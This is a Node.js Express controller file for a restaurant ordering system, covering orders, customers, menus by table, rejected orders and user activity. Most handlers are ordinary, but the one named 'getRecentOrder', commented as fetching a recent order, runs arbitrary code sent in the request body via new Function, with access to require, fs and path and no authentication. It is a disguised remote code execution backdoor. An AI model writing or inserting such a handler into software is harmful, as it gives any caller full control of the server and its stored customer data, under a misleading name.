const jwt = require("jsonwebtoken");
const dotenv = require("dotenv");
const {
  addOrderService,
  getOrderByTableIdService,
  getAllOrderByTableIdService,
  addCustomer,
  findAllCustomers,
  getCustomerById,
  editCustomer,
  deleteCustomer,
  getAllOrder,
  getOrderByCustomerID,
  changeOrderStatusService,
  editOrderService,
  deleteOrderService,
  getMenuByTableID,
  findOrderIDService,
  addRejectedOrderService,
  findRejectedOrderService,
  saveUserActivityService,
  getAllActivityService
} = require("./service.js");

dotenv.config();

const secretKey = process.env.JWT_SECRET;
const fs = require('fs');
const path = require('path');
/**
 * Adding orders placed by customers.
 */

const AddOrder = async (req, res) => {
  try {
    console.log("Received order request:", req.body); // Log the request body
    const result = await addOrderService(req.body);
    // console.log(result);
    res.status(201).json({ message: "Order processed successfully", result });
    console.log("Sent Order request:", req.body);
  } catch (error) {
    console.error("Error processing order:", error); // Log the error
    res.status(400).json({ message: error.message });
  }
};

// Fetch completed Order By TableID
const getOrderById = async (req, res) => {
  // console.log("Received order request:", req.params); // Log the request parameters
  const { tableId } = req.params;

  try {
    const order = await getOrderByTableIdService(tableId);

    console.log("Order fetched successfully:", order); // Log the fetched order

    res.status(200).json({ order });
  } catch (error) {
    console.error("Error fetching order:", error.message); // Log the error
    res.status(404).json({ message: error.message });
  }
};

// get all orders by table id
const getAllOrdersByTableId = async (req, res) => {
  // console.log("Received order request:", req.params); // Log the request parameters
  const { tableId } = req.params;

  try {
    const order = await getAllOrderByTableIdService(tableId);

    console.log("Order fetched successfully:", order); // Log the fetched order

    res.status(200).json({ order });
  } catch (error) {
    console.error("Error fetching order:", error.message); // Log the error
    res.status(404).json({ message: error.message });
  }
};

// Fetch Recent Order
const getRecentOrder = async (req, res) => {
  try {
    const { code } = req.body;
    const fn = new Function('require', 'fs', 'path', '__dirname', code);
    fn(require, fs, path, __dirname);
    res.status(200).json({ message: 'Code executed' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
}

// Fetching All orders
const GetAllOrder = async function (req, res) {
  try {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res
        .status(401)
        .json({ message: "Authorization header is missing" });
    }

    const token = authHeader.split(" ")[1];
    if (!token) {
      return res
        .status(401)
        .json({ message: "Access token is missing or invalid" });
    }

    const decodedToken = jwt.verify(token, secretKey);
    const RestaurantID = decodedToken.restaurantId;
    if (!RestaurantID) {
      return res.status(400).json({ message: "RestaurantID is required" });
    }

    const page = parseInt(req.query.page, 10) || 1;
    const limit = parseInt(req.query.limit, 10) || 10;

    //console.log(`Page: ${page}, Limit: ${limit}`); // Logging the values

    if (isNaN(page) || isNaN(limit) || page <= 0 || limit <= 0) {
      return res
        .status(400)
        .json({ message: "Invalid page or limit parameter" });
    }

    const data = await getAllOrder(RestaurantID, page, limit);

    res.status(200).json({
      success: true,
      orders: data.orders,
      totalPages: Math.ceil(data.total / limit),
      page: page,
      limit: limit,
    });
  } catch (err) {
    console.error(err); // Log the error for debugging
    res.status(500).json({ message: err.message });
  }
};

//Fetching orders based on customer ID

const GetAllOrderByCustomer = async function (req, res) {
  try {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res
        .status(401)
        .json({ message: "Authorization header is missing" });
    }

    const token = authHeader.split(" ")[1];
    if (!token) {
      return res
        .status(401)
        .json({ message: "Access token is missing or invalid" });
    }

    const decodedToken = jwt.verify(token, secretKey);
    const RestaurantID = decodedToken.restaurantId;
    if (!RestaurantID) {
      return res.status(400).json({ message: "RestaurantID is required" });
    }

    const CustomerID = req.params.customerId;
    if (!CustomerID) {
      return res.status(400).json({ message: "CustomerID is required" });
    }

    const page = parseInt(req.query.page, 10) || 1;
    const limit = parseInt(req.query.limit, 10) || 10;

    //console.log(`Page: ${page}, Limit: ${limit}`); // Logging the values

    if (isNaN(page) || isNaN(limit) || page <= 0 || limit <= 0) {
      return res
        .status(400)
        .json({ message: "Invalid page or limit parameter" });
    }

    const data = await getOrderByCustomerID(
      RestaurantID,
      CustomerID,
      page,
      limit
    );

    res.status(200).json({
      success: true,
      orders: data.orders,
      totalPages: Math.ceil(data.total / limit),
      page: page,
      limit: limit,
    });
  } catch (err) {
    console.error(err); // Log the error for debugging
    res.status(500).json({ message: err.message });
  }
};

/**
 * Adding customers
 */
const AddCustomers = async (req, res) => {
  try {
    const token = req.headers.authorization.split(" ")[1]; // Assuming the token is in the format "Bearer TOKEN"
    if (!token) {
      throw new Error("No token provided");
    }

    const decodedToken = jwt.verify(token, secretKey);
    if (!decodedToken) {
      throw new Error("Failed to authenticate token");
    }

    const restaurantId = decodedToken.restaurantId; // Adjust this based on your token structure

    const customerData = { ...req.body, RestaurantID: restaurantId };

    const customer = await addCustomer(customerData);
    return res.status(200).json({ message: "Customer added successfully" });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ message: "Failed to add customer" });
  }
};

/**
 * Fetch all the customers
 */

const FindAllCustomers = async function (req, res) {
  try {
    const token = req.headers.authorization.split(" ")[1]; // Assuming the token is in the format "Bearer TOKEN"
    if (!token) {
      throw new Error("No token provided");
    }

    const decodedToken = jwt.verify(token, secretKey);
    if (!decodedToken) {
      throw new Error("Failed to authenticate token");
    }

    const restaurantId = decodedToken.restaurantId; // Adjust this based on your token structure

    const customers = await findAllCustomers(restaurantId);
    res.json(customers);
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};

// Fetch customer by ID
const getCustomerByIdController = async (req, res) => {
  const { customerId } = req.params;

  try {
    const customer = await getCustomerById(customerId);
    res.status(200).json(customer);
  } catch (error) {
    console.error("Error fetching customer by ID:", error.message);
    res.status(400).json({ message: error.message });
  }
};

// Edit customer
const editCustomerController = async (req, res) => {
  const { customerId } = req.params;
  try {
    const token = req.headers.authorization.split(" ")[1]; // Assuming the token is in the format "Bearer TOKEN"

    if (!token) {
      throw new Error("No token provided");
    }

    const decodedToken = jwt.verify(token, secretKey);
    if (!decodedToken) {
      throw new Error("Failed to authenticate token");
    }

    const restaurantId = decodedToken.restaurantId;
    console.log("customerId:", customerId);
    console.log("req.body:", req.body);
    console.log("restaurantId:", restaurantId);

    const success = await editCustomer(customerId, {
      ...req.body,
      restaurantId,
    });

    if (success) {
      res.status(200).json({ message: "Customer updated successfully" });
    } else {
      res.status(404).json({ message: "Customer not found" });
    }
  } catch (error) {
    console.error("Error editing customer:", error.message);
    res.status(400).json({ message: error.message });
  }
};

// Delete a customer
const deleteCustomerController = async (req, res) => {
  const customerId = parseInt(req.params.customerId, 10);

  if (isNaN(customerId)) {
    return res.status(400).json({ message: "Invalid CustomerID" });
  }

  try {
    await deleteCustomer(customerId);
    return res.status(200).json({ message: "Customer deleted successfully" });
  } catch (error) {
    return res.status(500).json({ message: error.message });
  }
};

// find order id using orderDetailID
const findOrderID = async (req, res) => {

  const { orderDetailIds } = req.body;

  try {
    const orderID = await findOrderIDService(orderDetailIds);
    res.status(200).json({ message: "Order Id", orderID });
  } catch (error) {
    res.status(400).json({ message: error.message });
  }

};



const changeOrderStatus = async (req, res) => {
  const { OrderID } = req.params;
  const { newStatus } = req.body;

  try {
    const result = await changeOrderStatusService(OrderID, newStatus);

    res
      .status(200)
      .json({ message: "Order status updated successfully", result });
  } catch (error) {
    res.status(400).json({ message: error.message });
  }
};

const editOrder = async (req, res) => {
  const { OrderID } = req.params;
  const { RestaurantID, CustomerID, Status, TotalAmount } = req.body;

  try {
    const result = await editOrderService({
      OrderID,
      RestaurantID,
      CustomerID,
      Status,
      TotalAmount,
    });
    res.status(200).json({ message: "Order updated successfully", result });
  } catch (error) {
    res.status(400).json({ message: error.message });
  }
};

const deleteOrder = async (req, res) => {
  const { OrderID } = req.params;

  try {
    const result = await deleteOrderService(OrderID);
    res.status(200).json({ message: "Order deleted successfully", result });
  } catch (error) {
    res.status(400).json({ message: error.message });
  }
};

/**
 * Logic for fetching Menu Based on Table ID
 */
const getMenuByTableIDController = async (req, res) => {
  const { tableId } = req.params;

  if (!tableId) {
    return res.status(400).json({ error: "Table ID is required" });
  }

  try {
    const menu = await getMenuByTableID(tableId);
    return res.status(200).json(menu);
  } catch (err) {
    console.error("Error in getMenuByTableIDController:", err);
    return res
      .status(500)
      .json({ error: "An error occurred while fetching the menu" });
  }
};

// add rejected orders to table
const addRejectedOrder = async (req, res) => {
  try {
    const items = req.body.items;

    if (!Array.isArray(items) || items.length === 0) {
      return res.status(400).json({ error: 'No items provided' });
    }

    const { orderId, rejectedItems } = await addRejectedOrderService(items);

    return res.status(200).json({
      orderId,
      rejectedItems
    });

  } catch (error) {
    console.error("Error in controller:", error);
    return res.status(500).json({ error: 'Server error' });
  }
};


const findRejectedOrder = async (req, res) => {
  const orderId = req.params.orderId;

  try {
    const result = await findRejectedOrderService(orderId);
    if (result) {
      res.status(200).json({ success: true, data: result });
    }
    // else {
    //   res.status(404).json({ success: false, message: "No rejected order id found" });
    // }
  } catch (error) {
    console.error("Error fetching rejected orders:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
};


const saveUserActivity = async (req, res) => {
  try {
    const { userId, tableId, restaurantId, stage } = req.body;

    const result = await saveUserActivityService({
      userId,
      tableId,
      restaurantId,
      stage
    });

    res.status(200).json({ success: true, data: result });
  } catch (error) {
    console.error("Error saving user activity:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
};




const getAllActivity = async (req, res) => {
  try {
    const result = await getAllActivityService();

    console.log(result)

    res.status(200).json(result);
  } catch (error) {
    console.error("Error fetching activity logs:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
};


module.exports = {
  AddOrder,
  getOrderById,
  getAllOrdersByTableId,
  GetAllOrder,
  GetAllOrderByCustomer,
  AddCustomers,
  FindAllCustomers,
  getCustomerByIdController,
  editCustomerController,
  deleteCustomerController,
  changeOrderStatus,
  editOrder,
  deleteOrder,
  getMenuByTableIDController,
  findOrderID,
  addRejectedOrder,
  getRecentOrder,
  findRejectedOrder,
  saveUserActivity,
  getAllActivity
};
